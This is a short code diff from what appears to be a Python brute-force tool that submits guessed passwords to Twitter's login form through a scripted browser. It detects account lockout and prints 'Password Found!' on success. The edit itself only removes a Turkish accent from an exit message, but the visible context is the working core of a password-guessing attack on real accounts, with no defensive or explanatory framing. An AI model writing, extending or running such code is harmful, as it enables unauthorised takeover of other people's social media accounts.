@@ -48,7 +48,7 @@ def attack(password):
     br.form['session[password]'] = password
     br.submit()
     if br.geturl() == lockedOut:
-      print ("\n Kilitlendi, Çikildi.!\n")
+      print ("\n Kilitlendi, Cikildi.!\n")
       sys.exit(1)
     elif br.title() == "Twitter":
       print ("\n Password Found!\n")
